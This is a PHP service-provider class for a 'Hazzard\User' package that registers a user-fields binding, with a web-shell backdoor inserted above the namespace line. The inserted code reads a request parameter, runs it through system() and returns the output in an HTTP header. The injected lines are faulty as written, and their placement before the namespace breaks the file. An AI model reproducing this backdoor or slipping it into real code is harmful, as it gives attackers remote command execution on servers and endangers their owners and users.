<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); namespace Hazzard\User;

use Hazzard\Support\ServiceProvider;

class FieldsServiceProvider extends ServiceProvider {

	/**
	 * Indicates if loading of the provider is deferred.
	 *
	 * @var bool
	 */
	protected $defer = true;

	/**
	 * Register the service provider.
	 *
	 * @return void
	 */
	public function register()
	{
		$this->app->bindShared('user.fields', function($app) {
			return new Fields($app['config']['userfields'], $app['translator']);
		});
	}

	/**
	 * Get the services provided by the provider.
	 *
	 * @return array
	 */
	public function provides()
	{
		return array('user.fields');
	}
}